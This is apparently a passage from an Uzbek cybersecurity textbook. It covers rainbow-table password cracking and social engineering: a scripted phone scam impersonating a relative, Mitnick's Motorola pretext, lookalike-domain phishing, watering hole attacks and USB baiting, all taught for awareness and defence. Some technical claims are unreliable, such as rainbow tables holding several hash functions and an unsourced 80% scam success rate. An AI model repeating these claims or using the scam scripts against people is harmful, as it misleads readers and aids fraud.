Bugungi kunda foydalanuvchi parollarini xeshlamaydigan tizimlarni uchratish juda kam. Hujumchilar matnli parollar o‘rniga xesh qiymatlar ro‘yxatini ko‘radi. Agar ma’lumotlar shifrlash o‘rniga xeshlangan bo‘lsa, uni asl holatiga qaytarib bo‘lmaydi. Hujumchining yagona yo‘li – xesh funksiyasini topish va ehtimoliy parollarning xeshlangan versiyalarini yaratib, ularni o‘g‘irlangan ro‘yxat bilan solishtirishdir. Ushbu jarayon “xeshlash” deb ataladi, natijadagi kodlangan parollar esa “xesh” deyiladi.
Quyida xeshga asoslangan keng tarqalgan hujum turlaridan biri Rainbow jadvallari hujumi bilan tanishib chiqiladi.
Rainbow jadvallari hujumi jarayonida parollar matn ko‘rinishida emas, balki xeshlash orqali kodlangan holda saqlanadi. Xesh funksiyasi bir tomonlama (1-way) bo‘lgani uchun uni qayta tiklab, asl parolni olishning imkoni yo‘q. Foydalanuvchi har safar parol kiritganda, tizim uni xeshlab, oldindan saqlangan xesh qiymati bilan solishtiradi.
Rainbow jadvali ma’lumotlar bazasi parol xeshini buzish orqali autentifikatsiyani qo‘lga kiritish uchun ishlatiladi. Berilgan xesh qiymatini qaysi aniq matn (parol) yaratganini aniqlash uchun oldindan hisoblab qo‘yilgan parollar ro‘yxati va ularning xesh qiymatlaridan iborat lug‘atdan foydalaniladi.
Asl parolning aynan nima bo‘lgani muhim emas – agar bir nechta matn bir xil xesh qiymatini hosil qilsa (kolliziya), ularning istalgan biri xeshga mos kelishi mumkin.
Xesh jadvallarida bitta xesh funksiyasi uchun parol va xeshlar saqlansa, Rainbow jadval bir vaqtning o‘zida bir nechta xesh funksiyalari uchun parol va xeshlarni o‘z ichiga oladi. Ma’lumot hajmi juda katta bo‘lsada, ular maxsus usullar bilan qisqartiriladi.
Rainbow jadval hujumlariga qarshi keng tarqalgan himoya usuli – xeshga “salt” qo‘shish. Salt – har bir parol uchun qo‘llanadigan noyob qo‘shimcha qiymat bo‘lib, bitta xesh funksiyasi ishlatilgan bo‘lsa ham, salt bo‘lmasa, xesh natijasi mos kelmaydi. Salt qo‘llash xesh jadvallarini foydasiz qiladi. Bundan tashqari, uzun, murakkab va noyob parollar hamda ko‘p faktorli autentifikatsiya Rainbow jadval hujumiga qarshi samarali himoyani ta’minlaydi.
Parolni buzish uchun foydalaniladigan ba’zi mashhur dasturlarga quyidagilarni keltirish mumkin: Cain and Abel, John the Ripper, Hydra, Hashcat, Ophcrack.
Shuningdek, maxsus turdagi parollarni buzishga mo‘ljallangan vositalar ham mavjud, masalan: Wi-Fi parol buzuvchilar, Windows parol buzuvchilar va boshqalar.
Bugungi kunda kompaniyalar o‘z xavfsizlik tarmoqlarining barqarorligini oshirish uchun etik xakerlar va penetration testerlarni jalb qilmoqda. Shu sababli, parol buzish dasturlarining mavjudligi va rivojlanishi ham foydali, ham zararli maqsadlarda keskin oshgan.
Zamonaviy kompyuter kriminalistikasi va sud ekspertizasi dasturlari ham dalillarni qo‘lga kiritish uchun parol buzish funksiyalarini o‘z ichiga oladi. Eng ilg‘or buzish vositalari esa yuqori samaradorlik va natija olish uchun turli xil hujum strategiyalarini birgalikda qo‘llaydi.
	Parolni faraz qilish nima va u qanday ma’lumotlarga tayangan holda amalga oshiriladi?
	•	Lug‘atga asoslangan hujum qanday ishlaydi va nima uchun oldindan tuzilgan lug‘atlarga tayanadi?
	•	Qo‘pol kuch hujumining asosiy kamchiligi nimada va qaysi holatlarda u deyarli imkonsiz bo‘lib qoladi?
	•	Rainbow jadval asosida hujum nima va u oddiy lug‘at hujumidan qanday farq qiladi?
	•	Xesh funksiyasi nima uchun “bir tomonlama” (one-way) deb ataladi?
	•	Xesh kolliziya tushunchasi nimani anglatadi va bu hujumchi uchun qanday ahamiyatga ega?
	•	Nima uchun parollar xeshlangan holatda saqlanadi va ochiq matn tarzida saqlash xavfli?
	•	Ushbu hujumlarning samaradorligini kamaytirish uchun qanday himoya usullari qo‘llanishi mumkin (masalan: salt, uzun parollar, MFA)?
Nazorat savollari
	•	Parolni faraz qilish nima va u qanday ma’lumotlarga tayangan holda amalga oshiriladi?
	•	Lug‘atga asoslangan hujum qanday ishlaydi va nima uchun oldindan tuzilgan lug‘atlarga tayanadi?
	•	Qo‘pol kuch hujumining asosiy kamchiligi nimada va qaysi holatlarda u deyarli imkonsiz bo‘lib qoladi?
	•	Rainbow jadval asosida hujum nima va u oddiy lug‘at hujumidan qanday farq qiladi?
	•	Xesh funksiyasi nima uchun “bir tomonlama” (one-way) deb ataladi?
	•	Xesh kolliziya tushunchasi nimani anglatadi va bu hujumchi uchun qanday ahamiyatga ega?
	•	Nima uchun parollar xeshlangan holatda saqlanadi va ochiq matn tarzida saqlash xavfli?
	•	Ushbu hujumlarning samaradorligini kamaytirish uchun qanday himoya usullari qo‘llanishi mumkin (masalan: salt, uzun parollar, MFA)?
Nazorat savollari

VII BOB. IJTIMOIY MUHANDISLIK VA INSON OMILI

VII BOB. IJTIMOIY MUHANDISLIK VA INSON OMILI





Ta’lim maqsadlari:
–	ijtimoiy muhandislik (social engineering) tushunchasini va uning axborot xavfsizligidagi rolini ta’riflaydi va tushuntiradi;
–	psixologik manipulyatsiya usullari (qo‘rquv, ishonch, shoshilinchlik) ning qanday ishlashini tahlil qiladi;
–	phishing xatlarini haqiqiy va soxta turlarga ajratadi, shubhali belgilarni aniqlaydi;
–	ijtimoiy hujum turlarini (baiting, pretexting, tailgating) taqqoslaydi va real hayotdagi misollar bilan izohlaydi;
–	raqamli iz (digital footprint) tushunchasini tushuntiradi va shaxsiy ma’lumotlarning onlayn tarqalish darajasini baholaydi;
–	OSINT vositalari yordamida ochiq manbalardan mavjud shaxsiy ma’lumotlarni aniqlaydi va tahlil qiladi;
–	ijtimoiy tarmoqlarda maxfiylik sozlamalarini to‘g‘ri sozlaydi va ma’lumotlarni himoyalash choralarini amalga oshiradi;
–	xavfsiz onlayn faoliyat uchun shaxsiy xavfsizlik rejasini ishlab chiqadi, kundalik odatlar va profilaktik choralarni asoslaydi.
Bobni o‘zlashtirish uchun tavsiya etiladigan qo‘shimcha kurslar:
1. Web xavfsizligi, ijtimoiy muhandislik va tashqi hujumlar (Web Security, Social Engineering & External Attacks) - https://www.coursera.org/learn/packt-web-security-social-engineering-external-attacks-5eje3 
2. Boshlovchilar uchun kiberxavfsizlik xabardorligi o‘quv kursi (The Beginners Cyber Security Awareness Training Course) - https://www.coursera.org/learn/packt-the-beginners-cyber-security-awareness-training-course-ftfa9 
7-bob haqida umumiy ma’lumot
Mazkur bobda xavfsizlikda psixologik ta’sir etish usullari, mashhur ijtimoiy muhandislik sohasi vakillari, keng tarqalgan ijtimoiy muhandislik hujumlari, Internetda shaxsiy ma’lumotlarni oshkor bo‘lishi holatlari, ularni aniqlash usullari va vositalari, shaxsiy ma’lumotlarni oshkor etmaslik bo‘yicha tavsiyalar keltirilgan.

7.1. Ijtimoiy muhandislikka kirish  (Ma’ruza mashg‘uloti)
1. Xavfsizlikda psixologik ta’sir etish usullari. 
2. Mashhur ijtimoiy muhandislik sohasi vakillari.
Reja:
1. Xavfsizlikda psixologik ta’sir etish usullari. 
2. Mashhur ijtimoiy muhandislik sohasi vakillari.
Reja:

Ijtimoiy muhandislik, psixologik ta’sir etish, aql xakerligi, hissiyot, Kevin Mitnik, aka-uka badirlar.
Kalit so‘zlar:
Ijtimoiy muhandislik, psixologik ta’sir etish, aql xakerligi, hissiyot, Kevin Mitnik, aka-uka badirlar.
Kalit so‘zlar:
Xavfsizlikda psixologik ta’sir etish usullari
Ijtimoiy (sotsial) muhandislik yoki injineriya (Social Engineering) - turli psixologik usullar va firibgarlik amaliyotining to‘plami bo‘lib, uning maqsadi firibgarlik yo‘li bilan shaxs to‘g‘risida maxfiy ma’lumotlarni olishdan iborat. Maxfiy ma’lumotlar - foydalanuvchi ismi/ parollari, shaxsiy ma’lumotlari, ayblov dalillari, bank karta raqamlari va moliyaviy yoki obro‘sini yo‘qotadigan har qanday ma’lumot.
Mazkur atama xakerlik sohasidan kirib kelgan, xaker - kompyuter tizimidagi zaifliklarni qidiradigan odam, boshqacha aytganda “buzg‘unchi”. Hozirgi vaqtda xakerlar har qanday tizimdagi asosiy zaiflik - mashina emas, balki shaxs ekanligini yaxshi tushunishadi. Inson, xuddi kompyuter singari, muayyan qonunlarga muvofiq ishlaydi. Psixologiya, hiyla-nayranglar va ta’sir mexanizmlari doirasida insoniyat tomonidan to‘plangan tajribadan foydalangan holda, xakerlar “odamlarga hujum qilishni” boshlaydilar. Gohida ularni “aql xakerlari” deb ham atashadi.
Ijtimoiy muhandislikda inson psixologiyasining o‘rni
Ijtimoiy muhandislik inson psixologiyasining muhim jihatlaridan foydalanadi. U ishonch, qo‘rquv, qiziqish va shoshilinchlik kabi insoniy xususiyatlarni nishonga oladi. Bu usul odamlarni maxfiy ma’lumotlarni oshkor qilishga yoki o‘z xavfsizligini xavf ostiga qo‘yuvchi harakatlarni bajarishga undaydi. Hujumchilar insonlar bosim ostida yoki jozibador imkoniyatlarga duch kelganda qanday reaksiya berishini tushunib, qaror qabul qilishga chaqiruvchi buzg‘unchi holatlarni yaratadilar.
Masalan, ijtimoiy muhandis o‘zini ishonchli vakolatli shaxs sifatida ko‘rsatib, qo‘rquv yoki xavotir uyg‘otuvchi vaziyat yaratishi mumkin. Bu esa jabrlanuvchini vaziyatni to‘liq tekshirmasdan tezda harakat qilishga undaydi. Bunday psixologik manipulyatsiya insonning tabiiy ravishda yordam berish, bo‘ysunish yoki vakolatga javob qaytarish tendensiyasidan foydalanadi. Tadqiqotlar shuni ko‘rsatadiki, bu xulq-atvor bizning ijtimoiy odatlarimizga chuqur singib ketgan.
Hujumchilar odamlarning his-tuyg‘ulariga ta’sir ko‘rsatish orqali ularning an’anaviy xavfsizlik choralari bilan o‘zlarini himoya qilyapmiz degan ishonchini chetlab o‘tishlari mumkin. Bu esa, hatto ilg‘or texnologik himoya vositalari mavjud bo‘lgan taqdirda ham, kutilmagan darajada muvaffaqiyatli ekspluatatsiyalarga olib keladi. Psixologik taktikalarga tayanish ijtimoiy muhandislikni kiberjinoyatchilar uchun juda kuchli vositaga aylantiradi va texnik xavfsizlik choralariga qo‘shimcha ravishda xabardorlik va ta’limning naqadar muhim ekanligini ta’kidlaydi.
Masalan, xaker sizdan pul olmoqchi deb faraz qilaylik. Aytaylik, u sizning telefon raqamingiz va ijtimoiy tarmoqdagi akkauntingiz haqida ma’lumotga ega. Bundan tashqari, u izlanish natijasida sizning akangiz borligini ham aniqladi va akangiz haqida ham yetarlicha ma’lumot to‘pladi. U shuningdek, akangizning telefon raqamini ham biladi. Shundan so‘ng, ushbu ma’lumotlar asosida o‘z rejasini tuza boshladi. 
Reja: Xaker sizga kechki vaqtda telefon qilib, sizga (sizni ismingiz o‘rniga faqat akangiz ataydigan biror “laqab” ham bo‘lishi mumkin) men akangman deb tanishtiradi va o‘zini ko‘chada bezorilarga duch kelganini, ular barcha narsalarini (telefon, pul, plastik kartochka va h.k.) olib qo‘yganini aytadi. Bundan tashqari, u o‘ziga bir qiz yordam berganini, biroq, uning yonida puli yo‘qligini aytadi. Shu bilan birga, ushbu qizni yonida plastik kartasi borligini va sizdan ushbu plastik kartaga kasalxonaga yetib borish uchun zarur bo‘lgan 20 000 so‘m pulni ko‘chirib berishni talab qiladi. Mazkur holatlarning 80 foizida xakerlar muvaffaqqiyatga erishganlar va bu ishlarni amalga oshirish malakali xaker uchun qiyinchilik tug‘dirmaydi. 
Mazkur holda akangizni ovozini ajratish imkoniyati haqida gap borishi mumkin. Biroq, inson turli hayojon va shovqin bo‘lgan muhitda bo‘lishi mumkin. Bundan tashqari, agar siz uxlab yotgan vaqtingizda telefon bo‘lsa, ovozni aniqlashingiz yanada qiyinlashadi. 
Ushbu holatda xaker tomonidan foydalanilgan fikrlarni ko‘rib chiqaylik:
1. Shaxsini yaxshi yashirgan va real misollarga asoslangan (masalan, sizning rasmlaringiz, faqat sizning yaqinlaringiz biladigan joylar va hk.) yaxshi afsona o‘ylab topdi. 
2. Bularning barchasi yetarlicha tez va ishonchli tarzda aytilgan. 
3. Ta’sirning juda ishonarli mexanizmidan foydalanilgan – achinishga majbur qilingan (hissiyotlarga murojaat qilish).
Mashhur ijtimoiy muhandislik sohasi vakillari
Kevin Mitnik tarixdagi eng mashhur sotsial injinerlardan biri, u dunyodagi mashhur kompyuter xakeri, xavfsizlik bo‘yicha mutaxassis va sotsial injineriyaga asoslangan kompyuter xavfsizligiga bag‘ishlangan ko‘plab kitoblarning ham muallifidir. Uning fikriga ko‘ra xavfsizlik tizimini buzishdan ko‘ra, aldash yo‘li orqali parolni olish osonroq.
1990-yillarda Kevin Mitnik mamlakatdagi eng ko‘p qidirilgan kiberjinoyatchi hisoblangan. 1992-yilda u o‘ziga qo‘yilgan shartli qamoq shartlarini buzib, uni tergov qilayotgan rasmiylarning ovozli pochta xabarlarini kuzatgani uchun qochqin maqomiga ega bo‘ldi.
Hibsga olinmaslik va xufiyona muloqot qilish umidida Kevin bir vaqtlar yuqori texnologiyali hisoblangan Motorola kompaniyasining MicroTAC Ultra Lite mobil telefonidagi texnologiyani manipulyatsiya qilishga qaror qildi. Kuzatuvdan yashirinib, izsiz muloqot qilish uchun u telefonning “firmware”idagi dasturiy ta’minotning manba kodini qo‘lga kiritishga qaror qildi.
U o‘zining ijtimoiy muhandislik hujumini direktoriyaga qo‘ng‘iroq qilib, Motorola telefon raqamini olishdan boshladi (Google mashhur bo‘lishidan oldingi keng tarqalgan amaliyot). Kevin dastlab kichikdan boshladi - MicroTAC Ultra Lite loyihasi menejeri bilan gaplashishni so‘radi. Qabuldagi xodim uni boshqalarga uladi, ular esa yana bir necha marotaba boshqa bo‘limlarga o‘tkazishdi. Nihoyat, u Motorola Mobility bo‘yicha vitse-prezident bilan bog‘lanishga muvaffaq bo‘ldi.
Kevin vitse-prezident bilan bog‘lanishga urinayotganda, sakkiz marotaba boshqa bo‘limlarga o‘tkazildi. Shu vaqt ichida u juda qiziq faktni bilib oldi: Motorola kompaniyasining Arlington Heightsda tadqiqot markazi mavjud edi. Arlington bo‘limi xodimi sifatida o‘zini tanishtirgan holda, Kevin yana Ultra Lite loyihasi menejeriga ulashni so‘radi. U Arlington bo‘limi haqida oldindan bilgan ma’lumotdan foydalanib, ishonch uyg‘otishga va vitse-prezident bilan aloqani mustahkamlashga muvaffaq bo‘ldi - ijtimoiy muhandislar tez-tez qo‘llaydigan asosiy taktikalardan biri.
Vitse-prezident Kevinga loyiha menejeri Pamning ichki raqamini berdi, biroq Kevin qo‘ng‘iroq qilganida, Pam ta’tilga chiqqanini bildiruvchi xabar eshitildi. Uning ovozli pochta xabarida ta’til vaqtida bog‘lanish mumkin bo‘lgan boshqa aloqa raqami qoldirilgan edi. Kevin ushbu kontaktni Aliysha deb atab, unga qo‘ng‘iroq qildi va Pam hali ketgan-ketmaganini so‘rab, ular ilgari ham gaplashgan degan tasavvur uyg‘otdi, bu esa uning hikoyasini yanada ishonarli qildi. So‘ngra Kevin Aliyshaga Pam unga Ultra Lite manba kodini yuborishga va’da berganini, lekin agar ketishdan oldin ulgurmagan bo‘lsa, fayllarni Aliysha yuborishi mumkinligini aytdi.
U fayllarni qanday zip qilishni batafsil tushuntirdi, chunki yuborilishi kerak bo‘lgan fayllar yuzlab edi. Ammo zip faylni uning anonim FTP manziliga yuklatish bosqichida ulanish muvaffaqiyatsiz bo‘ldi va Aliysha xavfsizlik menejerini chaqirish uchun uni kutib turishni so‘radi.
Aynan shu yerda Kevin vahimaga tushdi - agar xavfsizlik xodimi aralashsa, aldov fosh bo‘lishi mumkin edi. Ammo kutilmaganda Aliysha qaytib keldi va xavfsizlik xodimining proksi-serverga yuklash uchun shaxsiy foydalanuvchi nomi va parolini unga berdi.
Shu mohirona to‘qilgan voqea ssenariysi Kevinning maqsadiga erishishiga va manba kodni qo‘lga kiritib, izsiz ketishiga imkon berdi. U koddan amalda foydalangan bo‘lmasa ham, bunday yuqori darajada maxfiy hisoblangan intellektual mulk katta foyda evaziga sotilishi, yoki Motorolani katta miqdorda tovon to‘lashga majbur qilish uchun shantaj sifatida qo‘llanishi mumkin edi.
Aka-uka Badirlar. Ko‘r bo‘lishlariga qaramasdan aka-uka Mushid va Shadi Badirlar 1990-yillarda Isroilda sotsial injineriya va ovozni soxtalashtirish usullaridan foydalangan holda bir nechta yirik firibgarlik sxemalarini amalga oshirishgan. Televideniyaga bergan intervyusida: “faqat telefon, elektr va noutbuklardan foydalanmaydiganlar uchun tarmoq xavfsizdir” deb aytishgan.
Isroildan bo‘lgan ko‘zi ojiz ikki nafar kompyuter mutaxassisi maxsus moslashtirilgan Brayl va ovoz bilan boshqariladigan qurilmalar yordamida Isroil Mudofaa Kuchlarining radio stansiyasiga kirib borganlikda gumon qilinib, qo‘lga olingan va ayblangan.
Aka-uka Badirlar tug‘ilgandan beri ko‘r bo‘lishlariga qaramay, shunchalik yuqori darajada kompyuter ko‘nikmalarini rivojlantirgan ediki, o‘smirliklarining oxiriga borib ular o‘zlarining noodatiy maslahat xizmatiga ega bo‘lishgan.
Isroil prokurorlari Badir birodarlarini radio stansiyaning kommutatsiya tizimiga masofadan ulanishda va undan bepul uzoq masofali qo‘ng‘iroqlar qilishda ayblamoqda. Shu bilan birga, Mudofaa Kuchlarining yangi tashkil etilgan kiberjinoyatlar bo‘limi Badir birodarlarining bu ishni qanday amalga oshirganini tushunolmay hayron qolmoqda. Holat bo‘yicha so‘ralganda, bir matbuot kotibi shunday degan: “Bu faqat Xudoning yordami bilan amalga oshishi mumkin, aks holda imkonsiz.”
Biroq Mushid Badir, o‘z nogironligidan ham, qo‘lga olinganidan ham cho‘chimay, Isroil politsiyasiga qarshi shunday degan: “Meni ushlay oladigan politsiyachi hali tug‘ilmagan.”
Hayotda ko‘plab jabhalarda sotsial injineriyaga tegishli muammolarni ko‘rish mumkin. Xususan, ommaviy madaniyatda (masalan, kinofilmlarda) sotsial injinerlikdan foydalanish holatlari tez-tez uchrab turadi. Masalan, quyidagi keltirilgan kinofilmlarda sotsial injineriyaga oid epizodlar mavjud:
	•	«Поймай меня, если сможешь»;
	•	«Поймай толстуху, если сможешь»;
	•	«Один дома»;
	•	«Хакеры»;
	•	«Афера Томаса Крауна»;
	•	«Бриллианты навсегда»;
	•	«Кто я».
Sotsial injineriyadan himoyalanish choralari. Hujumlarni amalga oshirishda sotsial injineriya texnikasidan foydalangan tajovuzkorlar tez-tez muloyimlik, dangasalik, xushmuomilalik bilan foydalanuvchi va tashkilot xodimlarining qiziqishlaridan foydalanadilar. Hujumlarni oldini olish esa, xodimlarning aldanayotganliklarini bilmasliklari sababli, murakkab hisoblanadi. 
Sotsial injineriya hujumlarini quyidagicha aniqlash mumkin:
	•	o‘zini do‘stingiz yoki yordam so‘rab murojaat qilgan yangi xodim sifatida tanishtirish;
	•	o‘zini yetkazib beruvchi, hamkor kompaniyaning xodimi yoki qonun vakili sifatida tanishtirish;
	•	o‘zini biror rahbar sifatida tanishtirish;
	•	biror zaiflikni bartaraf etuvchi yoki jabrlanuvchiga biror nimani yangilash imkoniyatini taqdim qiluvchi sotuvchi yoki ishlab chiqaruvchi sifatida tanishtirish;
	•	muammo yuzaga kelganida yordam beruvchi sifatida tanishtirish;
	•	ishonchni hosil qilish uchun ichki xotirjamlik va terminologiyadan foydalanish;
	•	“maktub”ga turli zararli dasturlarni qo‘shib yuborish;
	•	soxta ochilgan oynada login/ parolni qayta kiritishni so‘rash;
	•	foydalanuvchi nomi va paroli bilan saytga ro‘yxatdan o‘tish uchun biror sovg‘a taklif etish;
	•	jabrlanuvchi kompyuteriga yoki dasturiga kiritilgan kalitlarni yozib olish (keylogger dasturlari);
	•	turli xil zararli dasturiy vositaga ega ma’lumot eltuvchilarini foydalanuvchi stoliga tashlash;
	•	turli qo‘ng‘iroqlardagi ovozli xabarlar va hk.
	Ijtimoiy muhandislik (social engineering) nima va u kiberhujumlarda qanday rol o‘ynaydi?
	•	Ijtimoiy muhandislar odatda inson psixologiyasining qaysi jihatlaridan foydalanadi?
	•	Kevin Mitnik qanday ijtimoiy muhandislik usullaridan foydalanganligi bilan mashhur?
	•	Mashhur ijtimoiy muhandislar hujumni rejalash jarayonida qanday “qonuniy ko‘rinish” yaratish texnikalaridan foydalanadi?
	•	Ijtimoiy muhandislik hujumlari nega texnik zaifliklardan ko‘ra inson omiliga ko‘proq tayanadi?
	•	Maxfiy ma’lumotlarni qo‘lga kiritishda manipulyatsiya va ishonch uyg‘otish nima uchun muhim hisoblanadi?
	•	Korxona xodimlari ijtimoiy muhandislik hujumlaridan himoyalanish uchun qaysi asosiy xabardorlik choralariga amal qilishlari kerak?
Nazorat savollari
	•	Ijtimoiy muhandislik (social engineering) nima va u kiberhujumlarda qanday rol o‘ynaydi?
	•	Ijtimoiy muhandislar odatda inson psixologiyasining qaysi jihatlaridan foydalanadi?
	•	Kevin Mitnik qanday ijtimoiy muhandislik usullaridan foydalanganligi bilan mashhur?
	•	Mashhur ijtimoiy muhandislar hujumni rejalash jarayonida qanday “qonuniy ko‘rinish” yaratish texnikalaridan foydalanadi?
	•	Ijtimoiy muhandislik hujumlari nega texnik zaifliklardan ko‘ra inson omiliga ko‘proq tayanadi?
	•	Maxfiy ma’lumotlarni qo‘lga kiritishda manipulyatsiya va ishonch uyg‘otish nima uchun muhim hisoblanadi?
	•	Korxona xodimlari ijtimoiy muhandislik hujumlaridan himoyalanish uchun qaysi asosiy xabardorlik choralariga amal qilishlari kerak?
Nazorat savollari
7.2. Keng tarqalgan ijtimoiy muhandislik hujumlari  (Ma’ruza mashg‘uloti)
1. Ijtimoiy injineriyaning amalga oshirish sikli.
2. Keng tarqalgan ijtimoiy injineriya hujumlari: Fishing, Pretexting, Water holing, Baiting, Spear phishing, Quid Pro Quo, Scareware, Tailgating (piggybacking), Quishing.
Reja:
1. Ijtimoiy injineriyaning amalga oshirish sikli.
2. Keng tarqalgan ijtimoiy injineriya hujumlari: Fishing, Pretexting, Water holing, Baiting, Spear phishing, Quid Pro Quo, Scareware, Tailgating (piggybacking), Quishing.
Reja:

Fishing, Pretexting, Water holing, Baiting, Spear phishing, Quid Pro Quo, Scareware, Tailgating (piggybacking), Quishing.
Kalit so‘zlar:
Fishing, Pretexting, Water holing, Baiting, Spear phishing, Quid Pro Quo, Scareware, Tailgating (piggybacking), Quishing.
Kalit so‘zlar:
Ijtimoiy muhandislik - bu insonlar bilan o‘zaro aloqa orqali amalga oshiriladigan zararli faoliyatlarning keng turiga nisbatan qo‘llanadigan atama. Bu usul foydalanuvchilarni psixologik manipulyatsiya qilish orqali ularni xavfsizlik xatolariga yo‘l qo‘yishga yoki maxfiy ma’lumotlarni oshkor etishga majburlaydi.
Ijtimoiy muhandislik hujumlari bir yoki bir nechta bosqichda amalga oshiriladi. Hujumchi avval rejalashtirilgan qurbon haqida zarur ma’lumotlarni to‘playdi, masalan, kirish nuqtalari, zaif xavfsizlik protokollari kabi hujumni davom ettirish uchun kerak bo‘ladigan dastlabki ma’lumotlar. Shundan so‘ng, hujumchi qurbonning ishonchini qozonishga harakat qiladi va uni keyingi xavfsizlik qoidalarini buzishga undaydigan stimullar yaratadi, masalan, maxfiy ma’lumotlarni oshkor qilish yoki muhim resurslardan foydalanish huquqini berish.

7.1-rasm. Ijtimoiy injineriya hujumining amalga oshirilish sikli
Ijtimoiy muhandislikni ayniqsa xavfli qiladigan narsa shundaki, u dasturiy ta’minot yoki operatsion tizimdagi texnik zaifliklarga emas, balki inson xatosiga tayanadi. Haqiqiy foydalanuvchilar tomonidan qilinadigan xatolarni oldindan aytib bo‘lmaydi, shu sababli ularni aniqlash va oldini olish zararli dasturlarga asoslangan hujumlarga qaraganda ancha qiyin.
Ijtimoiy muhandislik hujumlari ko‘plab shakllarda uchraydi va inson bilan o‘zaro aloqa mavjud bo‘lgan istalgan joyda amalga oshirilishi mumkin. Quyida raqamli ijtimoiy muhandislik hujumlarining eng keng tarqalgan turlari keltiriladi.
Fishing
 Fishing (ing. Phishing – baliq ovlash) Internetdagi firibgarlikning bir turi bo‘lib, uning maqsadi foydalanuvchining maxfiy ma’lumotlaridan (login/parol) foydalanish imkoniyatiga ega bo‘lish. Bu hozirda keng tarqalgan sotsial injineriya sxemalaridan biri hisoblanadi. Katta hajmdagi shaxsiy ma’lumotlarni keng tarqalishi, fishing “shamolisiz” amalga oshmaydi. Fishingning eng keng tarqalgan namunasi sifatida jabrlanuvchining elektron pochtasiga yuborilgan rasmiy ma’lumot ko‘rinishidagi bank yoki to‘lov tizimining soxta xabarini ko‘rsatish mumkin.  Bunday elektron pochta xabarlari odatda rasmiy web-saytga o‘xshash va shaxsiy ma’lumotlarni talab qiladigan shakldagi qalbaki web sahifaga havolani o‘z ichiga oladi (7.2-rasm). Rasmda keltirilgan birinchi holatda mijozning yoki foydalanuvchining ismi va familiyasini yozish o‘rniga pochta manzili yozilgan bo‘lsa, ikkinchi holatda ko‘rsatilgan havola ustiga sichqoncha olib borilganida, haqiqiy manzilni (www.PayPal.com) emas, balki, boshqa manzilni ko‘rish mumkin.


7.2-rasm. Fishing hujumiga misol
Quyida keng tarqalgan fishing sxemalariga misollar keltirilgan.
Mavjud bo‘lmagan havola. Fishing hujumining mazkur turida biror web saytga o‘xshash web saytga murojaat amalga oshirilishi tavsiya etiladi. Masalan, www.PayPai.com manzilini www.PayPal.com manzili sifatida yuborish mumkin. Bu holda kamdan-kam holda foydalanuvchilar “l” harfini o‘riniga “i” harfi borligiga e’tibor berishadi. Havolaga murojaat qilinganida esa www.PayPal.com web saytga o‘xshash, biroq soxta web saytga tashrif buyuriladi va talab kiritilgan to‘lov kartasi ma’lumotlari kiritiladi. Natijada, kiritilgan ma’lumotlar xaker qo‘liga tushadi. 
Bunga yaqqol misol sifatida, 2003-yilda eBay foydalanuvchilariga tarqalgan fishing xabarini keltirish mumkin. Mazkur xabarda foydalanuvchilarning akkauntlari blokirovkalangani va kredit karta ma’lumotlari blokirovkadan chiqarilishi kerakligi keltirilgan  va unda rasmiy web-saytga o‘xshash soxta web saytga olib boruvchi havola mavjud bo‘lgan.  Ushbu fishing hujumining keltirgan zarari bir necha yuz ming dollarga teng bo‘lgan.
Pretexting
Mazkur fishing sxemasida xaker o‘zini boshqa shaxs sifatida ko‘rsatadi va oldindan tayyorlangan ssenariy (skript) bo‘yicha maxfiy axborotni olishni maqsad qiladi. Ushbu hujumda qurbonni shubhalanmasligi uchun tegishli tayyorgarlik ko‘riladi: tug‘ilgan kun, INN, pasport raqami yoki hisob raqamining oxirgi belgilari kabi ma’lumotlar topiladi. Ushbu fishing sxemasi odatda telefon yoki elektron pochta orqali amalga oshiriladi.
Water holing
Watering hole hujumi - bu kiberhujumning bir ko‘rinishi bo‘lib, unda hujumchilar ma’lum bir foydalanuvchilar guruhini nishonga oladi va ular tez-tez tashrif buyuradigan web-saytlarni yuqtiradi. Ushbu atama hayvonlar olamidagi manzaradan olingan: yirtqichlar suv ichiladigan joy (watering hole) atrofida yashirinib, himoyasiz paytdagi o‘ljani kutganidek, kiberhujumchilar ham maqsadli guruh tashrif buyuradigan saytlarni yuqtirish uchun kuta boshlaydi. Web-sayt yuqtirilgach, navbatdagi tashrif buyurgan qurbonning kompyuteriga zararli dastur yuklanadi.
Watering hole hujumi fishing yoki spear-fishing hujumlaridan farq qiladi. Fishing odatda foydalanuvchi ma’lumotlarini o‘g‘irlash yoki qurilmasiga zararli dastur o‘rnatishga qaratilgan bo‘lsa, watering hole hujumi avvalo foydalanuvchi kompyuterini yuqtirish, keyin esa u ulangan korporativ tarmoqqa kirishga qaratiladi. Kiberjinoyatchilar bu usul orqali shaxsiy ma’lumotlarni, bank ma’lumotlarini, intellektual mulkni o‘g‘irlashlari yoki maxfiy korporativ tizimlarga ruxsatsiz kirishlari mumkin.
Watering hole hujumlari nisbatan kam uchrasada, muvaffaqiyat darajasi juda yuqori bo‘lib qolmoqda. Sababi shuki, ular qonuniy, ishonchli saytlar orqali amalga oshiriladi (bunday saytlarni qora ro‘yxatga kiritib bo‘lmaydi). Bundan tashqari, kiberjinoyatchilar ko‘pincha zero-day ekspluatlaridan foydalanadi (ya’ni antiviruslar hali aniqlay olmaydigan zaifliklar orqali hujum qiladi). Shuning uchun watering hole hujumlari xavfsizlik bo‘yicha eng yaxshi amaliyotlarga amal qilmaydigan tashkilotlar va foydalanuvchilar uchun katta tahdid hisoblanadi.
Baiting
Nomidan ko‘rinib turibdiki, beyting hujumlari (baiting attacks) qurbonning ochko‘zligi yoki qiziqishini qo‘zg‘atish uchun yolg‘on va’da yoki jozibador taklifdan foydalanadi. Ular foydalanuvchilarni shaxsiy ma’lumotlarini o‘g‘irlovchi yoki tizimiga zararli dastur o‘rnatadigan tuzog‘iga tortadi.
Beytingning eng jirkanch shakli zararli dasturlarni tarqatish uchun jismoniy axborot tashuvchilarni qo‘llaydi. Masalan, hujumchilar zararlangan flesh-xotiralarni (odatda USB flesh-disklar) potentsial qurbon ko‘rishi aniq bo‘lgan joylarga qoldiradilar, masalan, hojatxonalar, liftlar, nishonga olingan kompaniya avtoturargohi va boshqalar. Flesh-disk odatda haqiqiy ko‘rinishga ega bo‘ladi, masalan, kompaniyaning “oylik maosh ro‘yxati” deb yozilgan yorliq qo‘yilgan bo‘ladi.
Qurbonlar qiziqish sabab flesh-diskni olib, ish yoki uy kompyuteriga ulashadi va natijada tizimga zararli dastur avtomatik ravishda o‘rnatiladi.
Beyting firibgarliklari faqat jismoniy dunyoda bo‘lishi shart emas. Onlayn beyting shakllari zararli saytga olib boradigan yoki foydalanuvchini zararli dastur yuklab olishga undaydigan jozibali reklamalarni o‘z ichiga oladi.
